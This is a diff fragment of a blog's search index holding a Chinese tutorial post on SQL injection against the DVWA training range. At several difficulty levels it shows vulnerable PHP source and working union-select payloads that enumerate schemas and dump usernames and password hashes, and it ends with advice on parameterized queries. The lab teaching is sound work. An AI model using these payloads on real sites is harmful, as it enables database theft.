$stmt-&gt;execute();</span><br><span class="line">                $result-&gt;finalize();</span><br><span class="line">                if ($result !== false) &#123;</span><br><span class="line">                    // There is no way to get the number of rows returned</span><br><span class="line">                    // This checks the number of columns (not rows) just</span><br><span class="line">                    // as a precaution, but it won&#x27;t stop someone dumping</span><br><span class="line">                    // multiple rows and viewing them one at a time.</span><br><span class="line"></span><br><span class="line">                    $num_columns = $result-&gt;numColumns();</span><br><span class="line">                    if ($num_columns == 2) &#123;</span><br><span class="line">                        $row = $result-&gt;fetchArray();</span><br><span class="line"></span><br><span class="line">                        // Get values</span><br><span class="line">                        $first = $row[ &#x27;first_name&#x27; ];</span><br><span class="line">                        $last  = $row[ &#x27;last_name&#x27; ];</span><br><span class="line"></span><br><span class="line">                        // Feedback for end user</span><br><span class="line">                        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>分析源码我们可以看到</p>
+<p>该级别的代码采用了PDO技术，划清了代码与数据的界限以防止SQL注入；</p>
+<h2 id="防御技术："><a href="#防御技术：" class="headerlink" title="防御技术："></a>防御技术：</h2><p>代码层最佳防御 sql 漏洞方案：<strong>采用 sql 语句预编译和绑定变量</strong>，是防御<br>sql 注入的最佳方法。<br>（ 1 ）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使<br>用参数而不是将用户输入变量嵌入到 SQL 语句中。当前几乎所有的数据库系统<br>都提供了参数化 SQL 语句执行接口，使用此接口可以非常有效的防止 SQL 注<br>入攻击。<br>（ 2 ）对进入数据库的特殊字符（ ‘ &lt;&gt;&amp;*; 等）进行转义处理，或编码转换。<br>（ 3 ）确认每种数据的类型，比如数字型的数据就必须是数字<br>（ 4 ）数据长度应该严格规定，能在一定程度上防止比较长的 SQL 注入语句<br>无法正确执行。<br>（ 5 ）网站每个数据层的编码统一，建议全部使用 UTF-8 编码，上下层编码<br>不一致有可能导致一些过滤模型被绕过。</p>
+<blockquote>
+<p>结尾防御技术借鉴于老师的实训讲义</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>web渗透基础</category>
+      </categories>
+      <tags>
+        <tag>安全</tag>
+        <tag>sql</tag>
       </tags>
   </entry>
   <entry>
@@ -560,268 +822,6 @@
       <tags>
         <tag>内网</tag>
         <tag>日志注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql注入学习</title>
-    <url>/2021/12/26/sql%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h4 id="前端时间实训讲了sql注入-但是因为那段时间只顾着打靶场了没有做笔记-今天完成第三四次作业时发现很多都忘记了-因此做这篇文章一方面分享知识-另一方面记录相关重要知识-方便后续复习回顾"><a href="#前端时间实训讲了sql注入-但是因为那段时间只顾着打靶场了没有做笔记-今天完成第三四次作业时发现很多都忘记了-因此做这篇文章一方面分享知识-另一方面记录相关重要知识-方便后续复习回顾" class="headerlink" title="前端时间实训讲了sql注入,但是因为那段时间只顾着打靶场了没有做笔记,今天完成第三四次作业时发现很多都忘记了,因此做这篇文章一方面分享知识,另一方面记录相关重要知识,方便后续复习回顾"></a>前端时间实训讲了sql注入,但是因为那段时间只顾着打靶场了没有做笔记,今天完成第三四次作业时发现很多都忘记了,因此做这篇文章一方面分享知识,另一方面记录相关重要知识,方便后续复习回顾</h4><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>我将通过DVWA靶场中的sql题目讲解SQL注入</p>
-<h5 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h5><p>SQL注入是因为后台SQL语句拼接了用户的输入，而且Web应用程序对用户输入数据的合法性没有判断和过滤，前端传入后端的参数是攻击者可控的，攻击者可以通过构造不同的SQL语句来实现对数据库查询、删除，增加，修改数据等等操作，如果数据库的用户权限足够大，还可以对操作系统执行操作.</p>
-<h5 id="类型"><a href="#类型" class="headerlink" title="类型:"></a>类型:</h5><h6 id="依据注入点类型分类"><a href="#依据注入点类型分类" class="headerlink" title="依据注入点类型分类"></a><strong>依据注入点类型分类</strong></h6><p>​    数字类型的注入</p>
-<p>​    字符串类型的注入</p>
-<p>​    搜索型注入</p>
-<span id="more"></span>
-
-<h6 id="依据提交方式分类"><a href="#依据提交方式分类" class="headerlink" title="依据提交方式分类"></a><strong>依据提交方式分类</strong></h6><p>​    GET注入</p>
-<p>​    POST注入</p>
-<p>​    COOKIE注入</p>
-<p>​    HTTP头注入</p>
-<h6 id="依据获取信息的方式分类"><a href="#依据获取信息的方式分类" class="headerlink" title="依据获取信息的方式分类"></a><strong>依据获取信息的方式分类</strong></h6><p>​    基于布尔的盲注</p>
-<p>​    基于时间的盲注</p>
-<p>​    基于报错的注入</p>
-<p>​    联合查询注入</p>
-<h6 id="堆查询注入-可同时执行多条语句"><a href="#堆查询注入-可同时执行多条语句" class="headerlink" title="堆查询注入 (可同时执行多条语句)"></a>堆查询注入 (可同时执行多条语句)</h6><h4 id="首先我们需要对数据库的基础知识有一定的了解"><a href="#首先我们需要对数据库的基础知识有一定的了解" class="headerlink" title="首先我们需要对数据库的基础知识有一定的了解"></a>首先我们需要对数据库的基础知识有一定的了解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql中注释符：# 、/**/ 、 --</span><br><span class="line"></span><br><span class="line">information_schema数据库中三个很重要的表：</span><br><span class="line"></span><br><span class="line">       information_schema.schemata: 该数据表存储了mysql数据库中的所有数据库的库名</span><br><span class="line"></span><br><span class="line">       information_schema.tables： 该数据表存储了mysql数据库中的所有数据表的表名</span><br><span class="line"></span><br><span class="line">       information_schema.columns: 该数据表存储了mysql数据库中的所有列的列名</span><br></pre></td></tr></table></figure>
-
-<h6 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE 库名1 character set utf-8; //创建数据库并库编码集为utf-8 支持中文</span><br></pre></td></tr></table></figure>
-
-<h6 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Product</span><br><span class="line">(字段1     CHAR(4)      NOT NULL,  </span><br><span class="line"> 字段2   VARCHAR(100) NOT NULL,</span><br><span class="line"> 字段3   VARCHAR(32)  NOT NULL,  //字段1,2,3不能为空</span><br><span class="line"> 字段4     INTEGER  );</span><br></pre></td></tr></table></figure>
-
-<p>每一列的数据类型（后述）是必须要指定的，数据类型包括：</p>
-<ul>
-<li>INTEGER 整数型</li>
-<li>NUMERIC ( 全体位数, 小数位数)</li>
-<li>CHAR 字符串,长度不能改变</li>
-<li>VARCHAR 字符串,长度可以改变</li>
-<li>DATE 日期型</li>
-</ul>
-<h6 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 字段名1,字段名2,字段名3 from 库1.表1 ;//查询库1里面表1的对应记录</span><br></pre></td></tr></table></figure>
-
-<p>当我们只想查找某条记录时,我们可以加上where语句</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 字段名1,字段名2,字段名3 from 库1.表1 where 字段名1=&#x27;xx&#x27;; //查询库1里面表1的字段名为1的对应记录</span><br></pre></td></tr></table></figure>
-
-<h6 id="更新语句"><a href="#更新语句" class="headerlink" title="更新语句"></a>更新语句</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE 表1</span><br><span class="line">   SET 字段1 = &#x27;xxx&#x27;; //更新表1字段1数据为xxx</span><br></pre></td></tr></table></figure>
-
-<h6 id="删除表语句"><a href="#删除表语句" class="headerlink" title="删除表语句"></a>删除表语句</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE 表1;</span><br></pre></td></tr></table></figure>
-
-<h4 id="靶场测试"><a href="#靶场测试" class="headerlink" title="靶场测试"></a>靶场测试</h4><p>DVWA靶场</p>
-<p>注:第一次进入靶场,难度默认为impossible,我们需要把他调成对应的难度</p>
-<h4 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h4><h6 id="检测是否存在sql注入"><a href="#检测是否存在sql注入" class="headerlink" title="检测是否存在sql注入"></a>检测是否存在sql注入</h6><img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/1.png" class="">
-
-<p>当我们输入1后,他会显示对应的用户信息</p>
-<p>对应源码:这里只展示与我们本题有关的源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;;</span><br><span class="line">            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">            // Get results</span><br><span class="line">            while( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">                // Get values</span><br><span class="line">                $first = $row[&quot;first_name&quot;];</span><br><span class="line">                $last  = $row[&quot;last_name&quot;];</span><br></pre></td></tr></table></figure>
-
-<p>服务器端的low.php并没有对客户输入的id进行任何检查与过滤，直接将SQL语句的执行结果显示给客户端。</p>
-<p>当我们输入1’时查看返回结果</p>
-<img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/2.png" class="">
-
-<p>可以确定确实存在sql注入</p>
-<p>当我们输入1时.</p>
-<p>实际传入服务器的语句是SELECT first_name, last_name FROM users WHERE user_id = ‘1’;</p>
-<p>很明显这就是我们刚才讲的sql查询语句,并且可以看到服务器并没有对我们提交的参数进行检查.</p>
-<h6 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h6><p>通过order by 猜测字段数,只有当我们知道了对应的字段数,才能利用union进行下一步的操作</p>
-<p>union介绍</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.Union必须由两条或者两条以上的SELECT语句组成，语句之间使用Union链接。</span><br><span class="line">2.Union中的每个查询必须包含相同的列、表达式或者聚合函数，他们出现的顺序可以不一致（这里指查询字段相同，表不一定一样）</span><br><span class="line">3.列的数据类型必须兼容，兼容的含义是必须是数据库可以隐含的转换他们的类型</span><br></pre></td></tr></table></figure>
-
-<p>对应的源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>payload①</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 3 --  </span><br></pre></td></tr></table></figure>
-
-<p>1后面的’用于将参数之前的’闭合 –后面有一个空格用于注释到参数后面的’ </p>
-<p>order by语句官方介绍</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ORDER BY 语句</span><br><span class="line">ORDER BY 语句用于根据指定的列对结果集进行排序。</span><br><span class="line">ORDER BY 语句默认按照升序对记录进行排序。</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/3.png" class="">
-
-<p>可以看到返回结果为不知道的列3在…中</p>
-<p>当我们重新构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 2 --</span><br></pre></td></tr></table></figure>
-
-<p>发现回显正常.因此可以断定前表共有两个字段.</p>
-<p>再次构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,2 --</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/4.png" class="">
-
-<p>页面回显正常,并且将我们的1,2也给返回到页面中了,因此我们可以在1,2中构造恶意的语句进行查询</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select version(),2 -- </span><br></pre></td></tr></table></figure>
-
-<p>查询数据库版本信息</p>
-<p>前面我们说了三个重要的表,现在他们派上用场了</p>
-<p>如何根据数据库得知其中的数据表呢，我们可以根据information_schema数据库中的schemata，tables,columns三个表格,这三个表格包括了数据库所有的库名,表明和字段名</p>
-<img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/5.png" class="">
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select SCHEMA_NAME,2 FROM INFORMATION_SCHEMA.SCHEMATA # //查询所有的数据库名</span><br></pre></td></tr></table></figure>
-
-<p>查到了DVWA数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select TABLE_NAME,2 FROM INFORMATION_SCHEMA.TABLES where  INFORMATION_SCHEMA.TABLES.TABLE_SCHEMA=&#x27;dvwa&#x27;# //查询DVWA所有的表格</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select user,password from dvwa.users # //查询user表格下的用户名和密码</span><br></pre></td></tr></table></figure>
-
-<p>得到的密码一般为hash,网上有专门的解密网站.</p>
-<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>源码:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $id = $_POST[ &#x27;id&#x27; ];</span><br><span class="line"></span><br><span class="line">    $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id);</span><br><span class="line"></span><br><span class="line">    switch ($_DVWA[&#x27;SQLI_DB&#x27;]) &#123;</span><br><span class="line">        case MYSQL:</span><br><span class="line">            $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;</span><br><span class="line">            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &#x27;&lt;pre&gt;&#x27; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">            // Get results</span><br><span class="line">            while( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">                // Display values</span><br><span class="line">                $first = $row[&quot;first_name&quot;];</span><br><span class="line">                $last  = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">                // Feedback for end user</span><br><span class="line">                echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">        case SQLITE:</span><br><span class="line">            global $sqlite_db_connection;</span><br><span class="line"></span><br><span class="line">            $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;</span><br><span class="line">            #print $query;</span><br><span class="line">            try &#123;</span><br><span class="line">                $results = $sqlite_db_connection-&gt;query($query);</span><br><span class="line">            &#125; catch (Exception $e) &#123;</span><br><span class="line">                echo &#x27;Caught exception: &#x27; . $e-&gt;getMessage();</span><br><span class="line">                exit();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if ($results) &#123;</span><br><span class="line">                while ($row = $results-&gt;fetchArray()) &#123;</span><br><span class="line">                    // Get values</span><br><span class="line">                    $first = $row[&quot;first_name&quot;];</span><br><span class="line">                    $last  = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">                    // Feedback for end user</span><br><span class="line">                    echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                echo &quot;Error in fetch &quot;.$sqlite_db-&gt;lastErrorMsg();</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// This is used later on in the index.php page</span><br><span class="line">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span><br><span class="line">$query  = &quot;SELECT COUNT(*) FROM users;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line">$number_of_rows = mysqli_fetch_row( $result )[0];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>该题为了防止用户直接输入使用了下拉表单，我们可以通过Hackbar提交post请求</p>
-<h5 id="参数后面加’判断是否存在注入"><a href="#参数后面加’判断是否存在注入" class="headerlink" title="参数后面加’判断是否存在注入"></a>参数后面加’判断是否存在注入</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=2&#x27;&amp;Submit=Submit</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/6.png" class="">
-
-<p>发现单引号被转义了，大概就是addslashes等类似函数的转义作用，继续测试一下，看看自己的猜测是否准确，由于addslashes转义的字符有（单引号（’） 双引号（”） 反斜杠（\） NULL）,分别测试双引号、&amp;、-等其他字符，发现双引号被转义，但是&amp;等其他字符不会。猜测是否不是字符注入</p>
-<p>构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=3 order by 4&amp;Submit=Submit</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/7.png" class="">
-
-<p>果然和我们想的一样,接下来我们就可以用同样的方式获取用户名和密码,但是这里需要注意的是我们构造的payload需要绕过单号的转义</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=2 union select database(),version() &amp;Submit=Submit //查询当前所在数据库和对应的版本</span><br></pre></td></tr></table></figure>
-
-<p>‘dvwa’我们可以直接用database()来代替以绕过单引号转义</p>
-<p>构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=2 union select TABLE_NAME,2 FROM INFORMATION_SCHEMA.TABLES where  INFORMATION_SCHEMA.TABLES.TABLE_SCHEMA=database()&amp;Submit=Submit</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=2 union select user,password from dvwa.users &amp;Submit=Submit</span><br></pre></td></tr></table></figure>
-
-<h4 id="high"><a href="#high" class="headerlink" title="high"></a>high</h4><p>源码:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_SESSION [ &#x27;id&#x27; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $id = $_SESSION[ &#x27;id&#x27; ];</span><br><span class="line"></span><br><span class="line">    switch ($_DVWA[&#x27;SQLI_DB&#x27;]) &#123;</span><br><span class="line">        case MYSQL:</span><br><span class="line">            // Check database</span><br><span class="line">            $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;;</span><br><span class="line">            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">            // Get results</span><br><span class="line">            while( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">                // Get values</span><br><span class="line">                $first = $row[&quot;first_name&quot;];</span><br><span class="line">                $last  = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">                // Feedback for end user</span><br><span class="line">                echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);        </span><br><span class="line">            break;</span><br><span class="line">        case SQLITE:</span><br><span class="line">            global $sqlite_db_connection;</span><br><span class="line"></span><br><span class="line">            $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;;</span><br><span class="line">            #print $query;</span><br><span class="line">            try &#123;</span><br><span class="line">                $results = $sqlite_db_connection-&gt;query($query);</span><br><span class="line">            &#125; catch (Exception $e) &#123;</span><br><span class="line">                echo &#x27;Caught exception: &#x27; . $e-&gt;getMessage();</span><br><span class="line">                exit();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if ($results) &#123;</span><br><span class="line">                while ($row = $results-&gt;fetchArray()) &#123;</span><br><span class="line">                    // Get values</span><br><span class="line">                    $first = $row[&quot;first_name&quot;];</span><br><span class="line">                    $last  = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">                    // Feedback for end user</span><br><span class="line">                    echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                echo &quot;Error in fetch &quot;.$sqlite_db-&gt;lastErrorMsg();</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/8.png" class="">
-
-<p>这里我们发现当我们点击change your ID时和我们原先并不是一个页面</p>
-<p>分析源码可知,该题同样是字符型单引号注入,但是服务器限制了我们查询的记录数,每次只允许查询一条,这个我们可以后面通过mysql注释绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>最后payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select TABLE_NAME,2 FROM INFORMATION_SCHEMA.TABLES where  INFORMATION_SCHEMA.TABLES.TABLE_SCHEMA=&#x27;dvwa&#x27;# //查询DVWA所有的表格</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/9.png" class="">
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select user,password from dvwa.users#</span><br></pre></td></tr></table></figure>
-
-<p>但是最后大家应该都发现了,我们是在得到源代码基础上分析出来的,也就是白盒测试,但是在真实环境中,站点的源代码是不可能让我们所看到了,这就需要我们通过大量的尝试判断.并且这题如果在我们不知道源码的情况下当我们在参数后加’时并不能看到错误回显.这就需要我们有一定的经验,通过大量尝试解决.</p>
-<h5 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h5><p>源码:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $id = $_GET[ &#x27;id&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Was a number entered?</span><br><span class="line">    if(is_numeric( $id )) &#123;</span><br><span class="line">        $id = intval ($id);</span><br><span class="line">        switch ($_DVWA[&#x27;SQLI_DB&#x27;]) &#123;</span><br><span class="line">            case MYSQL:</span><br><span class="line">                // Check the database</span><br><span class="line">                $data = $db-&gt;prepare( &#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27; );</span><br><span class="line">                $data-&gt;bindParam( &#x27;:id&#x27;, $id, PDO::PARAM_INT );</span><br><span class="line">                $data-&gt;execute();</span><br><span class="line">                $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">                // Make sure only 1 result is returned</span><br><span class="line">                if( $data-&gt;rowCount() == 1 ) &#123;</span><br><span class="line">                    // Get values</span><br><span class="line">                    $first = $row[ &#x27;first_name&#x27; ];</span><br><span class="line">                    $last  = $row[ &#x27;last_name&#x27; ];</span><br><span class="line"></span><br><span class="line">                    // Feedback for end user</span><br><span class="line">                    echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                break;</span><br><span class="line">            case SQLITE:</span><br><span class="line">                global $sqlite_db_connection;</span><br><span class="line"></span><br><span class="line">                $stmt = $sqlite_db_connection-&gt;prepare(&#x27;SELECT first_name, last_name FROM users WHERE user_id = :id LIMIT 1;&#x27; );</span><br><span class="line">                $stmt-&gt;bindValue(&#x27;:id&#x27;,$id,SQLITE3_INTEGER);</span><br><span class="line">                $result = $stmt-&gt;execute();</span><br><span class="line">                $result-&gt;finalize();</span><br><span class="line">                if ($result !== false) &#123;</span><br><span class="line">                    // There is no way to get the number of rows returned</span><br><span class="line">                    // This checks the number of columns (not rows) just</span><br><span class="line">                    // as a precaution, but it won&#x27;t stop someone dumping</span><br><span class="line">                    // multiple rows and viewing them one at a time.</span><br><span class="line"></span><br><span class="line">                    $num_columns = $result-&gt;numColumns();</span><br><span class="line">                    if ($num_columns == 2) &#123;</span><br><span class="line">                        $row = $result-&gt;fetchArray();</span><br><span class="line"></span><br><span class="line">                        // Get values</span><br><span class="line">                        $first = $row[ &#x27;first_name&#x27; ];</span><br><span class="line">                        $last  = $row[ &#x27;last_name&#x27; ];</span><br><span class="line"></span><br><span class="line">                        // Feedback for end user</span><br><span class="line">                        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>分析源码我们可以看到</p>
-<p>该级别的代码采用了PDO技术，划清了代码与数据的界限以防止SQL注入；</p>
-<h2 id="防御技术："><a href="#防御技术：" class="headerlink" title="防御技术："></a>防御技术：</h2><p>代码层最佳防御 sql 漏洞方案：<strong>采用 sql 语句预编译和绑定变量</strong>，是防御<br>sql 注入的最佳方法。<br>（ 1 ）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使<br>用参数而不是将用户输入变量嵌入到 SQL 语句中。当前几乎所有的数据库系统<br>都提供了参数化 SQL 语句执行接口，使用此接口可以非常有效的防止 SQL 注<br>入攻击。<br>（ 2 ）对进入数据库的特殊字符（ ‘ &lt;&gt;&amp;*; 等）进行转义处理，或编码转换。<br>（ 3 ）确认每种数据的类型，比如数字型的数据就必须是数字<br>（ 4 ）数据长度应该严格规定，能在一定程度上防止比较长的 SQL 注入语句<br>无法正确执行。<br>（ 5 ）网站每个数据层的编码统一，建议全部使用 UTF-8 编码，上下层编码<br>不一致有可能导致一些过滤模型被绕过。</p>
-<blockquote>
-<p>结尾防御技术借鉴于老师的实训讲义</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>web渗透基础</category>
-      </categories>
-      <tags>
-        <tag>安全</tag>
-        <tag>sql</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>红队靶机五练习</title>
-    <url>/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/</url>
-    <content><![CDATA[<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息:"></a>靶机信息:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击机 kali</span><br><span class="line">ip:192.168.0.153</span><br><span class="line">靶机 web服务器</span><br><span class="line">网卡1:192.168.0.162</span><br><span class="line">网卡2:192.168.138.136</span><br><span class="line">靶机:域控</span><br><span class="line">ip:192.168.138.138</span><br></pre></td></tr></table></figure>
-
